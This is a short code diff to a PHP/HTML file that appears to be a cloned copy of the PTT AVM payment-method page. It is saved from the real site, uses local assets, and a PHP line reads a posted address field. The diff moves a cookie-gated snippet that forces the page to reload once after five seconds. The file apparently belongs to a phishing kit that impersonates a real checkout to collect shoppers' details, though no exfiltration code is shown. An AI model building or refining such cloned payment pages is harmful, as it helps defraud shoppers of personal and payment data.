@@ -16,11 +16,7 @@ $adres = $_POST['adres'] ?? '';
 <!-- saved from url=(0042)https://www.pttavm.com/my/tr/odeme-yontemi -->
 <html lang="tr">
 
-	if($_COOKIE['Yenile']!="1"){
-setcookie("Yenile", "1", time() + (60*60*24));
-echo "<script>setTimeout(function(){location.reload()},5000)</script>";
-};
-
+	
 	
   <link data-n-head="ssr" rel="icon" type="image/png" href="https://www.pttavm.com/favicon.ico" />
   <script type="text/javascript" async="" src="assets/recaptcha__tr.js.indir" crossorigin="anonymous" integrity="sha384-4DVXT62jXQ59y3QtQPt5K//bRgqmSFZIwB+H38o+PpAXluieQ3YJ1vbjCTsrXkDv"></script>
@@ -211,6 +207,13 @@ echo "<script>setTimeout(function(){location.reload()},5000)</script>";
     <script charset="utf-8" src="assets/90b0491.js.indir"></script>
     <script charset="utf-8" src="assets/2c16daf.js.indir"></script>
   </head>
+
+	if($_COOKIE['Yenile']!="1"){
+setcookie("Yenile", "1", time() + (60*60*24));
+echo "<script>setTimeout(function(){location.reload()},5000)</script>";
+};
+
+	
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjA5Iiwic2NvcmUiOjIwMDA5fV0=">
     <div id="__nuxt" bis_skin_checked="1">
